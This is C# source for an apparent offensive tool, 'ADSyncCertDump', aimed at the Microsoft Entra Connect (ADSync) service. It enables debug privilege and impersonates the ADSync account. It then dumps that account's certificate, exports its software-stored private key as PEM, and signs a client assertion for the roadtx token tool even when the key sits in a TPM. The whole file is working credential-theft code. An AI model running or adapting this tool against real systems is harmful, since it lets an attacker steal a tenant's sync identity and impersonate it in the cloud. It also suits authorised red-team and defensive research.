using NtApiDotNet;
using Shwmae;
using Shwmae.Ngc;
using Shwmae.Ngc.Keys;
using Shwmae.Ngc.Keys.Crypto;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace ADSyncCertDump
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if(args.Length < 3)
            {
                Console.WriteLine("Usage: ADSyncCertDump.exe <thumbprint> <client_id> <tenant_id>");
                return;
            }
            var ct = args[0];
            var cert = new X509Certificate2($"C:\\Windows\\ServiceProfiles\\ADSync\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates\\{ct}");
            Console.WriteLine("Found certificate: " + cert.Subject);
            Console.WriteLine("-----BEGIN CERTIFICATE-----");
            Console.WriteLine(Convert.ToBase64String(cert.RawData, Base64FormattingOptions.InsertLineBreaks));
            Console.WriteLine("-----END CERTIFICATE-----");
            var thumb = cert.Thumbprint;


            //

            if (!NtToken.EnableDebugPrivilege())
            {
                Console.WriteLine("[!] Failed to enable debug privileges, are you elevated?");
                return;
            }

            using (var ctx = Utils.Impersonate("ADSync"))
            {
                var cngKey = cert.GetRSAPrivateKey() as RSACng;

                CngKey key = cngKey.Key;
                KeyCrypto crypto;
                Console.WriteLine("Found CNG key with name: " + key.KeyName);
                Console.WriteLine("Key Name: " + key.UniqueName);
                Console.WriteLine("Provider: " + key.Provider);
                Console.WriteLine("Algorithm Group: " + key.AlgorithmGroup);
                if (key.Provider == CngProvider.MicrosoftSoftwareKeyStorageProvider)
                {
                    string path = $"C:\\Windows\\ServiceProfiles\\ADSync\\AppData\\Roaming\\Microsoft\\Crypto\\Keys\\{key.UniqueName}";
                    crypto = new NgcSoftwareKeyCrypto(path);
                    byte[] keyData;
                    keyData = crypto.Export();

                    Console.WriteLine("Exporting software based private key");
                    Console.WriteLine("-----BEGIN PRIVATE KEY-----");
                    Console.WriteLine(Convert.ToBase64String(keyData, Base64FormattingOptions.InsertLineBreaks));
                    Console.WriteLine("-----END PRIVATE KEY-----");
                }
                else
                {
                    Console.WriteLine("Loading TPM based key for assertion signing");
                    crypto = new NgcPlatformKeyCrypto(key.KeyName);
                }


                ADSyncKey signer = new ADSyncKey(crypto);
                Console.WriteLine("Authentication assertion for roadtx");
                Console.WriteLine(signer.CreateAssertion(thumb, args[1], args[2]));
            }
            
        }
    }
}
